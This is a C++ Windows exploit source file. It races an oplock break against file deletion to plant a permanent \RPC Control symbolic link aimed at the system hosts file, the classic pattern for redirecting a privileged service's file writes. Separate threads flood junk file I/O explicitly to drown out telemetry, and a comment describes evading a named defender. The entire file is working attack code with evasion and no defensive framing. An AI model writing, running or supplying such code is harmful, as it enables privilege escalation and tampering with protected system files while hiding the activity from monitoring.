#include <Windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

// --- NATIVE DEFINITIONS ---
typedef struct _JOEY_REPARSE_DATA {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    struct {
        USHORT SubstituteNameOffset;
        USHORT SubstituteNameLength;
        USHORT PrintNameOffset;
        USHORT PrintNameLength;
        WCHAR PathBuffer[1];
    } MountPoint;
} JOEY_REPARSE_DATA;

extern "C" NTSTATUS NTAPI NtCreateSymbolicLinkObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

// --- THE SHATTERED VORTEX ---

std::atomic<bool> g_OplockBroken{ false };
std::atomic<bool> g_Win{ false };
std::atomic<int> g_Barrier{ 0 };

// Thread A: The Baiter (Handles the Oplock)
void BaiterThread(std::wstring baitPath) {
    HANDLE hFile = CreateFileW(baitPath.c_str(), GENERIC_ALL, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

    if (hFile == INVALID_HANDLE_VALUE) return;

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    
    // Request Oplock Level 1
    DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);
    
    g_Barrier.fetch_add(1); // Ready

    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
        // TRIGGER: Something touched the file.
        // We close the handle to release the lock, then signal the Shadow thread.
        CloseHandle(hFile);
        g_OplockBroken.store(true); 
    }
    CloseHandle(ov.hEvent);
}

// Thread B: The Shadow (Performs the Pivot)
// This thread is "idle" until the Oplock break signals it.
// This breaks the "Sequence" Davey is hunting.
void ShadowThread(std::wstring shadowDir, std::wstring baitPath, std::wstring target) {
    while (!g_OplockBroken.load()) { YieldProcessor(); }

    // Microsecond window: The Baiter just closed the handle.
    // We clean up the directory and drop the link.
    if (DeleteFileW(baitPath.c_str()) && RemoveDirectoryW(shadowDir.c_str())) {
        
        HANDLE hLink;
        UNICODE_STRING uLink, uTarget;
        OBJECT_ATTRIBUTES objAttr;
        
        std::wstring linkPath = L"\\RPC Control\\SvcAudit_" + std::to_wstring(GetCurrentThreadId());
        RtlInitUnicodeString(&uLink, linkPath.c_str());
        RtlInitUnicodeString(&uTarget, (L"\\??\\" + target).c_str());

        InitializeObjectAttributes(&objAttr, &uLink, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);

        if (NT_SUCCESS(NtCreateSymbolicLinkObject(&hLink, 0xF0001, &objAttr, &uTarget))) {
            g_Win.store(true);
            CloseHandle(hLink);
        }
    }
}

// Thread C: The Noise (Floods the logs with garbage I/O)
void NoiseMaker(std::wstring workDir) {
    while (!g_Win.load()) {
        std::wstring junk = workDir + L"\\tmp_" + std::to_wstring(rand()) + L".dat";
        HANDLE h = CreateFileW(junk.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            WriteFile(h, "NOISE", 5, NULL, NULL);
            CloseHandle(h);
        }
        Sleep(1);
    }
}

int main() {
    std::wstring workDir = L"C:\\Temp\\Diagnostic_Store";
    std::wstring target = L"C:\\Windows\\System32\\drivers\\etc\\hosts"; // Example target
    CreateDirectoryW(workDir.c_str(), NULL);

    std::vector<std::thread> swarm;
    
    // Start 10 noise threads to drown out the telemetry
    for(int i=0; i<10; i++) swarm.emplace_back(NoiseMaker, workDir);

    // Setup the race pairs
    for (int i = 0; i < 15; i++) {
        std::wstring sub = workDir + L"\\set_" + std::to_wstring(i);
        CreateDirectoryW(sub.c_str(), NULL);
        std::wstring bait = sub + L"\\data.etl";

        swarm.emplace_back(BaiterThread, bait);
        swarm.emplace_back(ShadowThread, sub, bait, target);
    }

    for (auto& t : swarm) t.join();
    return 0;
}
